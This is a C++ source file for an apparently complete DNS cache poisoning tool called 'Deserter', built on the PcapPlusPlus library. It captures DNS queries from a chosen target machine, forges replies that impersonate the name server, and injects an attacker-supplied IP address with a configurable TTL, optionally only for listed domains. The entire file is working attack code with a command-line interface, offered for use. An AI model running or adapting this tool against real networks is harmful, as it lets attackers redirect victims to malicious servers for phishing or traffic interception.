#include "Program.h"

#include <EthLayer.h>
#include <IPv4Layer.h>
#include <UdpLayer.h>
#include <DnsLayer.h>

#include <chrono>
#include <thread>
#include <mutex>

#include "Screen.h"

Arguments Program::args {};
bool Program::isCapturing = false;
std::condition_variable Program::capturingEnded;

Program::Program(const std::string& name, int argc, char* argv[])
    : 
    name(name),
    parser(name)
{
    ParseArguments(argc, argv);
    InitCaptureInterface();
}

void Program::Run()
{
    PrintBanner();
    std::cout << "Waiting for DNS packets to come..." << std::endl;
    if(dev->startCapture(Program::OnPacketCapture, nullptr))
    {
        isCapturing = true;
        std::unique_lock<std::mutex> lckg(mtx);
        capturingEnded.wait(lckg, [this]{return !isCapturing;}); // Sleep until we have stopped capturing
    }

    if (!isCapturing)
    {
        dev->stopCapture();
        dev->close();
    }
}

void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev, void* cookie)
{
    pcpp::Packet parsedPacket(packet);

    pcpp::EthLayer* ethLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    pcpp::UdpLayer* udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>(); 
    pcpp::IPv4Layer* ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    pcpp::DnsLayer* dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();

    if(!dnsLayer) // the packet isn't a DNS one
        return;

    // Constructing the poisoned response
    uint16_t originalID = dnsLayer->getDnsHeader()->transactionID;

    pcpp::MacAddress sourceMac = ethLayer->getDestMac(); // They are switched because we are impersonating the name server
    pcpp::MacAddress destMac = ethLayer->getSourceMac();

    pcpp::IPv4Address sourceIP = ipLayer->getDstIPv4Address(); // They are switched because we are impersonating the name server
    pcpp::IPv4Address destIP = ipLayer->getSrcIPv4Address();

    uint16_t sourcePort = udpLayer->getDstPort(); // They are switched because we are impersonating the name server
    uint16_t destPort = udpLayer->getSrcPort();

    pcpp::DnsQuery* originalQuery = dnsLayer->getFirstQuery();
    std::string dnsQueryName = originalQuery->getName();

    if (args.specificDomains)
    {
        bool domainMatch = false;
        for (const std::string& domain : args.domains)
            domainMatch = dnsQueryName.compare(domain) == 0; 

        if (!domainMatch)
            return;
    }

    pcpp::DnsClass dnsClass = originalQuery->getDnsClass();
    pcpp::DnsType dnsType = originalQuery->getDnsType();

    pcpp::EthLayer poisonedEthLayer(sourceMac, destMac);
    pcpp::IPv4Layer poisonedIPLayer(sourceIP, destIP);
    pcpp::UdpLayer poisonedUdpLayer(sourcePort, destPort);
    pcpp::DnsLayer poisonedDnsLayer;
    poisonedDnsLayer.getDnsHeader()->transactionID = originalID;


    pcpp::IPv4DnsResourceData poisonedData(args.hostAddress);
    poisonedDnsLayer.addQuery(originalQuery);
    poisonedDnsLayer.addAnswer(dnsQueryName, dnsType, dnsClass, args.poisonTtl, &poisonedData)->setData(&poisonedData);

    pcpp::Packet poisonedPacket(100);

    poisonedPacket.addLayer(&poisonedEthLayer);
    poisonedPacket.addLayer(&poisonedIPLayer);
    poisonedPacket.addLayer(&poisonedUdpLayer);
    poisonedPacket.addLayer(&poisonedDnsLayer);

    poisonedPacket.computeCalculateFields();

    if (!dev->sendPacket(&poisonedPacket))
    {
        std::cerr << "Failed to send poisoned packet." << std::endl;
        isCapturing = false;
        capturingEnded.notify_all();
        return;

    }

    std::cout << "Poisoning successful." << std::endl;
    isCapturing = false;
    capturingEnded.notify_all();
    return;
}

void Program::PrintBanner()
{
    std::cout << "    ____                      __           " << std::endl;
    std::cout << "   / __ \\___  ________  _____/ /____  _____" << std::endl;
    std::cout << "  / / / / _ \\/ ___/ _ \\/ ___/ __/ _ \\/ ___/" << std::endl;
    std::cout << " / /_/ /  __(__  )  __/ /  / /_/  __/ /    " << std::endl;
    std::cout << "/_____/\\___/____/\\___/_/   \\__/\\___/_/     " << std::endl;
    std::cout << "                                           " << std::endl;
}

void Program::ParseArguments(int argc, char* argv[])
{
    parser.add_argument("-t", "--target").required().help("IP Address of the machine whose cache to poison");
    parser.add_argument("-i", "--interface").required().help("Network Interface to use (takes an IP address or a name");
    parser.add_argument("-b", "--bad_ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
    parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds). Defaults to 300s or 5min.").scan<'u', uint32_t>();
    parser.add_argument("-d", "--domains").help("Specific domains to poison - enter them in a comma-separated list without spaces");

    std::vector<std::string> errors;
    try
    {
        parser.parse_args(argc, argv);

        // parse bad IP
        args.hostAddress = pcpp::IPv4Address(parser.get("--bad_ip"));
        if (!args.hostAddress.isValid())
        {
            errors.push_back("Invalid malicious IP specified!");
        }

        // parse interface
        args.interfaceAddress = pcpp::IPv4Address(parser.get("--interface"));
        if (!args.interfaceAddress.isValid())
        {
            args.interfaceName = parser.get("--interface"); // checking for a valid name is done later to keep the code cleaner
        }

        // parse target IP
        args.targetIP = pcpp::IPv4Address(parser.get("--target"));
        if(!args.targetIP.isValid())
        {
            errors.push_back("Invalid target IP specified!");
        }

        // parse TTL
        args.poisonTtl = parser.get<uint32_t>("--ttl");
        
        if(parser.is_used("--domains"))
        {
            args.specificDomains = true;
            std::string domains = parser.get("--domains");

            size_t pos = 0;
            // Put the domains in a list
            while ((pos = domains.find(",")) != std::string::npos) 
            {
                args.domains.push_back(domains.substr(0, pos));
                domains.erase(0, pos + 1);
            }
        }

        if(errors.size() != 0)
        {
            std::string error_message = "";
            for (const auto& err : errors)
                error_message += err + "\n";
            throw std::runtime_error(error_message);
        }
    }
    catch(const std::runtime_error& err)
    {
        std::cerr << err.what() << '\n';
        std::cout << parser;
        exit(0);
    }


}

void Program::InitCaptureInterface()
{
    if (args.interfaceAddress.isValid())
    {
        dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(args.interfaceAddress);
        if (dev)
        {
            args.interfaceName = dev->getName();
        }
        else
        {
            std::cerr << "Invalid interface." << std::endl;
            exit(0);
        }
    }
    else
    {
        dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(args.interfaceName);
        if (dev)
        {
            args.interfaceAddress = dev->getIPv4Address();
        }
        else
        {
            std::cerr << "Invalid interface!" << std::endl;
            exit(0);
        }
    }

    if (!dev->open())
    {
        std::cerr << "Failed to open interface." << std::endl;
        exit(0);
    }

    // Setup the filters
    pcpp::IPFilter ipFilter(args.targetIP.toString(), pcpp::SRC);

    if(!dev->setFilter(ipFilter))
    {
        std::cerr << "Failed to setup capture filters." << std::endl;
        exit(0);
    }
}